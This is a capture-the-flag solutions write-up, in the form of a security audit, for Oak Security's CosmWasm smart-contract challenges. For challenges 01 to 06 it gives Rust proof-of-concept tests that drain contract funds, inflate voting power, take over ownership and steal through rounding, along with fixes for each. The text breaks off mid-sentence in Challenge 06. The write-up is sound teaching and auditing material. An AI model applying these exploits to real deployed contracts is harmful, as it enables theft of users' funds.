# Solutions for Oak Security Capture The Flag - AwesomWasm Online Event

This repository contains the solutions for the challenges offered by Oak Security in their [Cosmwasm CTF](https://github.com/oak-security/cosmwasm-ctf).

A Security Audit report for the [Oak Security Capture The Flag ⛳️](https://github.com/oak-security/cosmwasm-ctf/), presented to you by:

# :star: :star: forbiddnstars :star: :star:

:copyright: 2023, the @forbiddnstars. [Follow us on Twitter](https://twitter.com/forbiddnstars)!


- [Challenge 01: *Mjolnir*](#challenge-01-mjolnir)
  - [Description](#description)
  - [Proof of concept](#proof-of-concept)
  - [Recommendation](#recommendation)
- [Challenge 02: *Gungnir*](#challenge-02-gungnir)
  - [Description](#description-1)
  - [Proof of concept](#proof-of-concept-1)
  - [Recommendation](#recommendation-1)
- [Challenge 03: *Laevateinn*](#challenge-03-laevateinn)
  - [Description](#description-2)
  - [Proof of concept](#proof-of-concept-2)
  - [Recommendation](#recommendation-2)
- [Challenge 04: *Gram*](#challenge-04-gram)
  - [Description](#description-3)
  - [Proof of concept](#proof-of-concept-3)
  - [Recommendation](#recommendation-3)
- [Challenge 05: *Draupnir*](#challenge-05-draupnir)
  - [Description](#description-4)
  - [Proof of concept](#proof-of-concept-4)
  - [Recommendation](#recommendation-4)
    - [Fix flow of control](#fix-flow-of-control)
    - [Avoid assigning arbitrary input](#avoid-assigning-arbitrary-input)
    - [Code Linting](#code-linting)
    - [Avoid arbitrary message execution through `OwnerAction`](#avoid-arbitrary-message-execution-through-owneraction)
- [Challenge 06: *Hofund*](#challenge-06-hofund)
  - [Finding 1](#finding-1)
  - [Description](#description-5)
  - [Proof of concept](#proof-of-concept-5)
  - [Recommendation](#recommendation-5)
  - [Finding 2](#finding-2)
  - [Description](#description-6)
  - [Proof of concept](#proof-of-concept-6)
  - [Recommendation](#recommendation-6)
- [Challenge 07: *Tyrfing*](#challenge-07-tyrfing)
  - [Description](#description-7)
  - [Proof of concept](#proof-of-concept-7)
  - [Recommendation](#recommendation-7)
- [Challenge 08: *Gjallarhorn*](#challenge-08-gjallarhorn)
  - [Description](#description-8)
  - [Proof of concept](#proof-of-concept-8)
  - [Recommendation](#recommendation-8)
- [Challenge 09: *Brisingamen*](#challenge-09-brisingamen)
  - [Description](#description-9)
    - [Primary finding: Unfair distribution of rewards](#primary-finding-unfair-distribution-of-rewards)
    - [Secondary finding: Small rounding errors in rewards](#secondary-finding-small-rounding-errors-in-rewards)
  - [Proof of concept](#proof-of-concept-9)
    - [POC for the primary finding: Unfair distribution of rewards](#poc-for-the-primary-finding-unfair-distribution-of-rewards)
    - [POC for the secondary finding: Rounding errors](#poc-for-the-secondary-finding-rounding-errors)
  - [Recommendation](#recommendation-9)
- [Challenge 10: *Mistilteinn*](#challenge-10-mistilteinn)
  - [Description](#description-10)
  - [Proof of concept](#proof-of-concept-10)
  - [Recommendation](#recommendation-10)


## Challenge 01: *Mjolnir*

**Duplicate ids in withdraw allow an attacker to drain all the funds**


### Description

The function `withdraw` accepts a vector of identifiers that store the data
about the user's funds locked up by the contract. The code of `withdraw` does
not ensure that the vector contains only unique identifiers. Hence, the attacker
is able to withdraw as many funds as they want, by introducing duplicate
identifiers in the vector.

Specifically, the identifiers are processed in [a
loop](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-01/src/contract.rs#L81-L85)
without checking for duplicates. Further, the `total_amount` of funds to be
withdrawn is increased for every element of `lockups` in [line
94](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-01/src/contract.rs#L94).
As lockups may contain duplicates, `total_amount` may be larger than the actual
amount deposited by the user.

As a result, an unpriviliged user may deposit `MINIMUM_DEPOSIT_AMOUNT` tokens
and withdraw `n * MINIMUM_DEPOSIT_AMOUNT` for an arbitrary `n`, when the
contract has at least `n * MINIMUM_DEPOSIT_AMOUNT` tokens. This allows the
attacker to withdraw all funds from the contract in multiples of
`MINIMUM_DEPOSIT_AMOUNT`. This can be done by executing one `deposit` and one
`withdraw` transaction. This will **drain almost all of the funds** from the
contract account.

To withdraw the remaining `x < MINIMUM_DEPOSIT_AMOUNT` tokens, it is sufficient
to deposit `2 * MINIMUM_DEPOSIT_AMOUNT - x` tokens and then withdraw `2 *
MINIMUM_DEPOSIT_AMOUNT` tokens. This will **drain exactly all funds** from the
contract account.
 
### Proof of concept

Add the following test to
[integration_tests.rs](https://github.com/oak-security/cosmwasm-ctf/blob/main/ctf-01/src/integration_tests.rs):

```rust
    #[test]
    fn exploit_flow() {
        let (mut app, contract_addr) = proper_instantiate();

        let sender = Addr::unchecked(USER);

        // test query
        let msg = QueryMsg::GetLockup { id: 1 };
        let lockup: Lockup = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
        assert_eq!(lockup.owner, sender);

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // withdraw all funds as multiples of MINIMUM_DEPOSIT_AMOUNT
        const MULTIPLE_TO_WITHDRAW: u16 = 11;
        let msg = ExecuteMsg::Withdraw { ids: vec![1; usize::from(MULTIPLE_TO_WITHDRAW)] };
        app.execute_contract(sender, contract_addr.clone(), &msg, &[])
            .unwrap();

        // verify multiple of deposited funds received
        let user_balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        assert_eq!(user_balance, MINIMUM_DEPOSIT_AMOUNT * Uint128::from(MULTIPLE_TO_WITHDRAW));

        // verify that the contract has no funds left
        let contract_balance =
          app.wrap().query_balance(contract_addr.clone(), DENOM).unwrap().amount;
        assert_eq!(contract_balance, Uint128::new(0));
    }
```

Note that we withdraw `11 * MINIMUM_DEPOSIT_AMOUNT` tokens, whereas the user has
deposited only `MINIMUM_DEPOSIT_AMOUNT` tokens.

Since the test setup in
[proper_instantiate](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-01/src/integration_tests.rs#L23C12-L23C30)
deposits `10 * MINIMUM_DEPOSIT_AMOUNT` tokens on the contract account, we do not have to withdraw remainders, since the final amount withdrawn is an integer multiple of the amount deposited. If we had to also withdraw some remainder `x < MINIMUM_DEPOSIT_AMOUNT`, as discussed above, we would add two more transactions:

 - deposit `2 * MINIMUM_DEPOSIT_AMOUNT - x` tokens
 - withdraw `2 * MINIMUM_DEPOSIT_AMOUNT` tokens

### Recommendation

There are multiple ways to fix the issue. The most straightforward way is to check
for duplicates and return an error as soon as a duplicate has been found. For example,
add the following code after [line 83](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-01/src/contract.rs#L83) in `contract.rs`:

```rust
        if lockups.clone().into_iter().find(|l| l.id == lockup_id).is_some() {
            return Err(ContractError::Unauthorized {})
        }
```

The above test is quadratic in the number of elements in `ids`. If the
expectation is that the vector `ids` can grow large, then you could first sort `ids`
via `sort` and remove duplicates via `dedup`.

We use `ContractError::Unauthorized`, since it already exists in the codebase.
For a better user experience, we recommend adding a dedicated error type.

---


## Challenge 02: *Gungnir*

**Native integer underflow allows an unprivileged user to achieve an unfair amount of voting power.**

### Description

The vulnerability occurs because of the native Rust `u128`, which permits unsafe integer arithmetics while the overflow checks are disabled in the `release` profile configuration. In particular:

- the contract state [stores voting power](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-02/src/state.rs#L11) as `u128`;
- the configuration in `Cargo.toml` [disables overflow checks](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-02/Cargo.toml#L27) for the `release` profile.

As a result, all arithmetic operations using the `voting_power` per-user variable, with insufficiently checked inputs could result in over- or underflow, allowing us to manipulate the contract state in uninteded ways. The vulnerability specifically occurs in the function [unstake()](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-02/src/contract.rs#L122-L147):

```rust
/// Entry point for users to decrease voting power
pub fn unstake(
    ...
    unlock_amount: u128,
) -> Result<Response, ContractError> {
    ...
    user.voting_power -= unlock_amount;
    ...
}
```

The `unstake` function is a contract entry point, which:

- accepts `unlock_amount` as `u128`
- doesn't have any checks on its supplied value
- subtracts it from the user's `voting_power` (also `u128`), thus potentially resulting in an underflow.

Any user, who has staked even a single coin, can exploit the vulnerability to gain arbitrarily large voting power, as demonstrated by the PoC below.

### Proof of concept

Put the code fragment below into [integration_tests.rs:154](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-02/src/integration_tests.rs#L154), and make sure to execute the test in `release` mode. As can be seen, the user ends up with no staked funds, but with an (arbitrary) large voting power.

```rust
    // run with "cargo test --release" to trigger the exploit
    #[test]
    fn exploit_flow() {
        let (mut app, contract_addr) = proper_instantiate();

        let amount = Uint128::new(1_000);

        app = mint_tokens(app, USER.to_string(), amount);
        let sender = Addr::unchecked(USER);

        // deposit funds
        let msg = ExecuteMsg::Deposit {};
        app.execute_contract(
            sender.clone(),
            contract_addr.clone(),
            &msg,
            &[coin(amount.u128(), DENOM)],
        )
        .unwrap();

        // normal stake
        let msg = ExecuteMsg::Stake {
            lock_amount: amount.u128(),
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // query voting power
        let msg = QueryMsg::GetVotingPower {
            user: (&USER).to_string(),
        };
        let voting_power: u128 = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(voting_power, amount.u128());

        // fast forward time
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // unstake with overflow
        let msg = ExecuteMsg::Unstake {
            unlock_amount: u128::MAX - 10110_u128,
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // The user ends with no staked funds, but a large voting power
        let msg = QueryMsg::GetVotingPower {
            user: (&USER).to_string(),
        };
        let voting_power: u128 = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(voting_power, 11111_u128);
    }  
```

### Recommendation

The are multiple ways to fix this vulnerability:

- enable [overflow checks](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-02/Cargo.toml#L27) in `Cargo.toml`: should be `overflow-checks = true`.
- for [storing voting power](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-02/src/state.rs#L11), instead of `u128`, employ the type `Uint128`, which has embedded over- and underflow checks when performing arithmetic operations.

We recommend employing both of the above suggestions.

---


## Challenge 03: *Laevateinn*

**Lack of validation of user supplied addresses leads to a complete flash loan contract takeover and a drain of all contract funds**

### Description

The challenge contains 3 smart contracts ([flash_loan](https://github.com/oak-security/cosmwasm-ctf/tree/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-03/contracts/flash_loan), [proxy](https://github.com/oak-security/cosmwasm-ctf/tree/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-03/contracts/proxy), [mock_arb](https://github.com/oak-security/cosmwasm-ctf/tree/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-03/contracts/mock_arb)), all of which suffer from the same vulnerability: they accept the [Addr](https://docs.rs/cosmwasm-std/latest/cosmwasm_std/struct.Addr.html) struct in the user messages. As is written in the `Addr` struct documentation:

> Addr must not be used in messages sent by the user because this would result in unvalidated instances.

Usage of unvalidated `Addr` instances in CosmWasm contracts may lead to multiple vulnerabilities; in this particular case it allows an unprivileged user to take ownership of the flash loan contract, and subsequently drain all contract funds. The vulnerability is comprised of the following components:

- The [RequestFlashLoan message](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-03/packages/common/src/proxy.rs#L11) of the `proxy` contract accepts an unvalidated `Addr` as the `recipient` field.
- The [request_flash_loan() function](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-03/contracts/proxy/src/contract.rs#L48-L106) of the `proxy` contract [compares](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-03/contracts/proxy/src/contract.rs#L59C3-L61) the `recipient` address from the user input to the stored address of the flash loan contract.

```rust
    if recipient == config.flash_loan_addr {
        return Err(ContractError::CallToFlashLoan {});
    }
```

While `config.flash_loan_addr` should [pass the validation](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-03/contracts/proxy/src/contract.rs#L24) in order to be accepted, the `recipient` address does not. The validation, in particular, ensures that the address is in the canonical format, and the string is lower-case. An unvalidated, user-supplied `recipient` may be upper-case, thus bypassing the check above, but still be considered a valid address. This allows instructions to be forwarded to the flash loan contract, as is demonstrated below. 

### Proof of concept

We execute the following exploit:

1. A message for the flash loan contract, which transfers the ownership to the (unprivileged) user, is prepared;
2. The user calls the `proxy` contract to request a flash loan, supplying the prepared message, and the upper-cased address of the flash loan contract as the `recipient`, in order to bypass the check and execute the message on the flash loan contract;
3. When the crafted message is executed, the user becomes the owner of the flash loan contract, and can withdraw all contract funds.

Put the test below after [proxy/src/integration_tests.rs:161](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-03/contracts/proxy/src/integration_tests.rs#L161):

```rust
    #[test]
    fn exploit_flow() {
        let (mut app, proxy_contract, flash_loan_contract, _mock_arb_contract) =
            proper_instantiate();

            // 1. prepare flash contract msg    
            let flash_msg = to_binary(&FlashLoanExecuteMsg::TransferOwner {
                new_owner: Addr::unchecked(USER),
            })
            .unwrap();
            
            // 2. transfer ownership to the user, supplying the upper-cased flash loan contract address
            app.execute_contract(
                Addr::unchecked(USER),
                proxy_contract.clone(),
                &ExecuteMsg::RequestFlashLoan {
                    recipient: Addr::unchecked(flash_loan_contract.to_string().to_uppercase()),
                    msg: flash_msg.clone(),
                },
                &[],
            )
            .unwrap();

            // 3. The user is now the owner of the flash loan contract, and can drain all the funds
            app.execute_contract(
                Addr::unchecked(USER),
                flash_loan_contract.clone(),
                &FlashLoanExecuteMsg::WithdrawFunds {
                    recipient: Addr::unchecked(USER),
                },
                &[],
            )
            .unwrap();

            // verify all funds have been transferred to the user
            let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
            assert_eq!(balance, Uint128::new(10_000));
    }
```

### Recommendation

The [Addr](https://docs.rs/cosmwasm-std/latest/cosmwasm_std/struct.Addr.html) struct is intended for internal use in contracts; all user-supplied addresses should pass through the "border control" before being admitted to the safe internal contract area. In the case of this system contracts, the recommendation amounts to the following:

- Replace all `Addr` types for fields in user-facing messages with the `String` type in the respective files in [packages/common/src](https://github.com/oak-security/cosmwasm-ctf/tree/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-03/packages/common/src);
- When processing the input messages, make sure to translate `String` input addresses to the internal `Addr` addresses before performing any operations with them, as is done in the proxy's [ instantiate()](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-03/contracts/proxy/src/contract.rs#L24):

```rust
    let flash_loan_addr = deps.api.addr_validate(&msg.flash_loan_addr).unwrap();
```

---


## Challenge 04: *Gram*

**Employing contract balance as a state variable, in combination with a rounding error, allows an unprivileged user to withdraw more funds than deposited.**

### Description

The contract is supposed to allow users to mint shares in exchange for depositing funds to the contact, and to withdraw the funds in exchange for shares afterwards. The contract contains a combination of two vulnerabilities:

- It uses the contract balance as part of its critical state, neglecting the fact that funds can be sent to the contract without any special privileges. Both [mint()](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-04/src/contract.rs#L43C1-L84) and [burn()](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-04/src/contract.rs#L86-L130) functions employ the same logic, shown here on the [example from burn()](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-04/src/contract.rs#L93-L101):

    ```rust
    let mut config = CONFIG.load(deps.storage).unwrap();

    let contract_balance = deps
        .querier
        .query_balance(env.contract.address.to_string(), DENOM)
        .unwrap();

    let total_assets = contract_balance.amount;
    let total_supply = config.total_supply;
    ```

    As can be seen above, `total_supply` is stored explicitly in the contract state, while `total_assets` is queried from the contract balance; thus creating the opportunity to influence computations from the side of an unprivileged user.

- The contract uses integer division with rounding via the function [multiply_ratio() of Uint128](https://docs.rs/cosmwasm-std/latest/cosmwasm_std/struct.Uint128.html#method.multiply_ratio) as demonstrated below on the [example from burn()](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-04/src/contract.rs#L103-L104):
  
    ```rust
    // asset = share * total assets / total supply
    let asset_to_return = shares.multiply_ratio(total_assets, total_supply);
    ```

    As noted in the documentation for `multiply_ratio()`:
    > Due to the nature of the integer division involved, the result is always floored. E.g. 5 * 99/100 = 4.

    Thus, when using this function to calculate shares to return to the user in exchange for funds, the user may receive fewer shares than they should have received due to the floor rounding.


It should be noted that, while each of the above vulnerabilities is dangerous, only a combination of both creates the exploitable vulnerability for the contract in question. In particular, if there was no possibility to influence the contract balance, `total_assets` would always be equal to `total_shares` and the ratio in the above equation would always be `1` (i.e. `total_assets == total_shares` is a system invariant). In this case, no rounding errors would be possible

But querying `total_assets` from the contract ballance, instead of storing it, creates the possibility to skew the multiple from `1`, and thus makes rounding errors possible and exploitable, as demonstrated by the below PoC.
  
### Proof of concept

We execute the following exploit:

0. Initial funds are minted for the users
1. `user` sends 2 coins to the contract, and receives 2 shares in exchange
2. `user` burns 1 of the shares, but sends `10000` coins attached to the message, which get added to the `total_assets` before the calculation takes place. As a result, each of the two shares costs `5001` coins, and the user receives that amount back for one share burnt.
3. `user2` mints shares, sending `10000` coins. As this is less than the cost of 2 shares, `user2` receives only 1 share for their coins, thus, effectively they lose `4999` coins, unaware of that. Simultaneously, the price of 1 share increases from `5001` to `7500.5` 
4. `user` burns their 1 remaining share, and receives `7500` coins in exchange, out of which `2499` originally belonged to `user2`
5. `user2` wants to burn all their shares, and thus queries the balance of shares on the contract. This and the next step can be part of an automatic procedure, so they might not even notice that they have fewer coins.
6. `user2` burns all of their shares (beleiving they had more than `1`), and receives all remaining contract funds, namely `7501`.
7. We verify that `user` has withdrawn `2499` coins more, and `user2` has received `2499` coins fewer than they deposited, and that no funds are left in the contract.

Put the test below after [integration_tests.rs:L127](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-04/src/integration_tests.rs#L127):


```rust
#[test]
fn exploit_flow() {
    let (mut app, contract_addr) = proper_instantiate();

    // mint funds to users
    app = mint_tokens(app, USER.to_owned(), Uint128::new(10_002));
    app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));

    // 1. mint shares for user
    app.execute_contract(
        Addr::unchecked(USER),
        contract_addr.clone(),
        &ExecuteMsg::Mint {},
        &[coin(2, DENOM)],
    )
    .unwrap();

    // 2. burn shares for user, while sending funds to the contract
    app.execute_contract(
        Addr::unchecked(USER),
        contract_addr.clone(),
        &ExecuteMsg::Burn {
            shares: Uint128::new(1),
        },
        &[coin(10_000, DENOM)],
    )
    .unwrap();

    let bal = app.wrap().query_balance(USER, DENOM).unwrap();
    assert_eq!(bal.amount, Uint128::new(5_001));

    // 3. mint shares for user2; due to rounding, some shares are lost
    app.execute_contract(
        Addr::unchecked(USER2),
        contract_addr.clone(),
        &ExecuteMsg::Mint {},
        &[coin(10_000, DENOM)],
    )
    .unwrap();

    // 4. burn shares for user, gaining part of the coins of user2
    app.execute_contract(
        Addr::unchecked(USER),
        contract_addr.clone(),
        &ExecuteMsg::Burn {
            shares: Uint128::new(1),
        },
        &[],
    )
    .unwrap();

    let bal = app.wrap().query_balance(USER, DENOM).unwrap();
    assert_eq!(bal.amount, Uint128::new(12_501));

    // 5. query user2 shares
    let balance: Balance = app
        .wrap()
        .query_wasm_smart(
            contract_addr.clone(),
            &QueryMsg::UserBalance {
                address: USER2.to_string(),
            },
        )
        .unwrap();        
    
    // 6. burn all shares for user2
    app.execute_contract(
        Addr::unchecked(USER2),
        contract_addr.clone(),
        &ExecuteMsg::Burn {
            shares: balance.amount,
        },
        &[],
    )
    .unwrap();

    // 7. user now has 2499 extra coins
    let bal = app.wrap().query_balance(USER, DENOM).unwrap();
    assert_eq!(bal.amount, Uint128::new(12_501));

    // user2 now has 2499 less coins
    let bal = app.wrap().query_balance(USER2, DENOM).unwrap();
    assert_eq!(bal.amount, Uint128::new(7_501));

    // no coins are left in the contract
    let bal = app
        .wrap()
        .query_balance(contract_addr.to_string(), DENOM)
        .unwrap();
    assert_eq!(bal.amount, Uint128::zero());
}
```

### Recommendation

We recommend the following actions in order to fix the vulnerabilities: 

- do not employ contract balance as part of the state, and instead store the `total_assets` explicitly as part of the contract state. I.e., instead of the current [Config struct](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-04/src/state.rs#L6-L8) use the updated variant below, and update the contract logic accordingly:

    ```rust
    pub struct Config {
        pub total_supply: Uint128,
        pub total_assets: Uint128,
    }
    ```

- do not employ [multiply_ratio() of Uint128](https://docs.rs/cosmwasm-std/latest/cosmwasm_std/struct.Uint128.html#method.multiply_ratio) for shares calculation: this may result in large rounding errors even with a small number of coins, as demonstrated in the PoC. Instead, we recommend employing some floating or fixed-point library for fractional numbers, such as [cosmwasm-std::Decimal](https://docs.rs/cosmwasm-std/latest/cosmwasm_std/struct.Decimal.html), for which the multiplication functions  limit the rounding errors to at most 1 coin. Be aware that other kinds of rounding errors may happen with fractional numbers, as outlined in our solution to the Challenge 09 *Brisingamen*.

- prohibit the sending of additional funds in `burn()`, for example by calling [`cw_utils::nonpayable`](https://docs.rs/cw-utils/1.0.1/cw_utils/fn.nonpayable.html)


---


## Challenge 05: *Draupnir*

**Due to a syntax error on ownership transfer, all contract funds can be drained.**

### Description

The contract function [accept_owner()](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-05/src/contract.rs#L125-L142) contains [the following fragment](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-05/src/contract.rs#L129-L131):

```rust
if state.proposed_owner != Some(info.sender.clone()) {
    ContractError::Unauthorized {};
}
```

This fragment, which is supposed to check that the sender of the message has previously been proposed as a new owner, appears innocent at first glance, but actually does not have a `return` statement. This completely changes the logic of function execution: instead of aborting, and returning an error, the execution continues and changes the owner to whoever sends this message, without any preconditions.

### Proof of concept

The following code fragment demonstrates how this error can be exploited to drain all contract funds. The `base_scenario()` sets the stage:

- The contract has been instantiated with zero funds.
- `USER1` and `USER2` deposit `10_000` tokens each.
- The owner role is assigned to the `ADMIN` address.

The exploit then proceeds as follows:

1. The attacker accepts a (non-existing) ownership change proposal;
2. The bank message is prepared that transfers all contract funds to the attacker address;
3. The attacker executes the crafted message, inside the `OwnerAction` envelope, and drains all contract funds.

```rust
#[test]
fn exploit_flow() {
    let (mut app, contract_addr) = base_scenario();

    const ATTACKER: &str = "attacker";

    // 1. Attacker takes over the contract by accepting a (non-proposed)
    //    ownership transfer
    app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &ExecuteMsg::AcceptOwnership {},
        &[],
    )
    .unwrap();

    // 2. The bank message to transfer contract funds to the attacker
    let msg = BankMsg::Send {
        to_address: ATTACKER.to_string(),
        amount: vec![coin(20_000, DENOM)],
    };

    // 3. Attacker executes the message, and drains all contract funds
    app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &ExecuteMsg::OwnerAction { msg: CosmosMsg::Bank(msg) }, 
        &[],
    )
    .unwrap();

    // verify contract doesn't have any funds left
    let balance = app
    .wrap()
    .query_balance(contract_addr.to_string(), DENOM)
    .unwrap();
    assert_eq!(balance.amount, Uint128::zero());

    // verify all funds have been transferred to the attacker
    let balance = app.wrap().query_balance(Addr::unchecked(ATTACKER), DENOM).unwrap().amount;
    assert_eq!(balance, Uint128::new(20_000));
}
```

### Recommendation

#### Fix flow of control

As a first mitigation, the affected statement should be fixed to exhibit proper flow of control.
Replace the code in [`contract.rs` L130](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-05/src/contract.rs#L130) with

```rust
        return ContractError::Unauthorized {};
```

#### Avoid assigning arbitrary input

We also propose, as a secondary mitigation, that the following assignment in [`contract.rs` L134](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-05/src/contract.rs#L134):

```rust
        state.current_owner = info.sender.clone();
```

is replaced with

```rust
        state.current_owner = state.proposed_owner.unwrap()?;
```

This could also have prevented the ownership change to an arbitrary user, since `proposed_owner` would have been propagated as the new owner, instead of the method caller. We do not, however, recommend implementing this change without also implementing the return statement above, as an attacker would still be able to execute ownership change "on the proposed owner's behalf", which is not a severe issue, but likely unintended.

#### Code Linting

This is a trivial error, with costly consequences, that is easy to catch. We recommend running [Clippy linter](https://doc.rust-lang.org/stable/clippy/index.html) on the contract code base. Here is the result of executing the `cargo clippy` command, which directly points at the vulnerability:

```sh
warning: statement with no effect
   --> src/contract.rs:130:9
    |
130 |         ContractError::Unauthorized {};
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |
    = help: for further information visit https://rust-lang.github.io/rust-clippy/master/index.html#no_effect
    = note: `#[warn(clippy::no_effect)]` on by default

warning: `oaksecurity-cosmwasm-ctf-05` (lib) generated 1 warning
```

#### Avoid arbitrary message execution through `OwnerAction`

Finally, we would like to point out that while the trigger for the exploit is the discussed vulnerability, the attack vector that leads to the severe impact is the presence of the [OwnerAction message](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-05/src/msg.rs#L15). `OwnerAction` allows for the execution of arbitrary messages on behalf of the contract, thus providing broad possibilities for various exploits. Instead of having such a generic entry point, we recommend reducing the attack surface by thinking through specific scenarios which the owner needs to execute, and implementing those as separate contract messages.

---

## Challenge 06: *Hofund*

### Finding 1

**Failure to refund tokens on failed proposals leads to incorrect, exploitable vote count.**

### Description

The smart contract allows users to cast votes on a proposal by depositing CW20 governance tokens.
When a user issues a `ResolveProposal`, the cast tokens are tallied against their total supply.
If the balance is greater or equal than a third of the total supply, the proposer becomes the owner
of the contract. Otherwise, the proposal fails.

The contract fails to refund cast governance tokens if a proposal fails. Thus,
those tokens count towards the next proposal, allowing a second proposer, even one different to the first proposer, to win with
less than 1/3 of the votes.

### Proof of concept

Insert the following code at the end of [`integration_tests.rs`](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-06/src/integration_tests.rs#L238).

First, `USER1` proposes themselves. They receive 39,999 of 120,000 tokens, just shy
of the required 1/3. After the voting window, `USER1` resolves the proposal, which fails.
`USER2` immediately proposes themselves, and submits a single token in their own favor.
The voting window passes, `USER2` resolves the proposal, and wins the vote, even though
only a single vote was cast in their favor.

```rust
    #[test]
    fn exploit_flow() {
        let (mut app, contract_addr, token_addr) = proper_instantiate();

        // User1 propose themselves
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap();

        // Admin votes with 39,999 of 120,000 tokens
        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
        app.execute_contract(
            Addr::unchecked(ADMIN),
            token_addr.clone(),
            &Cw20ExecuteMsg::Send {
                contract: contract_addr.to_string(),
                msg,
                amount: Uint128::new(39_999),
            },
            &[],
        )
        .unwrap();

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(VOTING_WINDOW);
        });

        // User1 ends proposal
        let result = app
            .execute_contract(
                Addr::unchecked(USER1),
                contract_addr.clone(),
                &ExecuteMsg::ResolveProposal {},
                &[],
            )
            .unwrap();

        // Proposal failed
        assert_eq!(result.events[1].attributes[2], attr("result", "Failed"));

        // User2 propose themselves
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Propose {},
            &[],
        )
        .unwrap();

        // User2 votes with 1 of 120,000 tokens
        let msg = to_binary(&Cw20HookMsg::CastVote {}).unwrap();
        app.execute_contract(
            Addr::unchecked(USER2),
            token_addr,
            &Cw20ExecuteMsg::Send {
                contract: contract_addr.to_string(),
                msg,
                amount: Uint128::new(1),
            },
            &[],
        )
        .unwrap();

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(VOTING_WINDOW);
        });

        // User2 ends proposal
        let result = app
            .execute_contract(
                Addr::unchecked(USER2),
                contract_addr.clone(),
                &ExecuteMsg::ResolveProposal {},
                &[],
            )
            .unwrap();

        assert_eq!(result.events[1].attributes[2], attr("result", "Passed"));

        // Proposal was successful with a single vote!!
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.owner, USER2.to_string());
        // forbiddnstars
    }
```

### Recommendation

Governance tokens should be refunded (or the total supply burnt, and reminted)
when a proposal is resolved as `"Failed"`.

---

### Finding 2

**Wrong comparison operator flips the valid window for resolving proposals.**

### Description

When resolving a proposal, `resolve_proposal` is supposed to [check whether the voting window has passed](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-06/src/contract.rs#L113-L116):

```rust
    if current_proposal
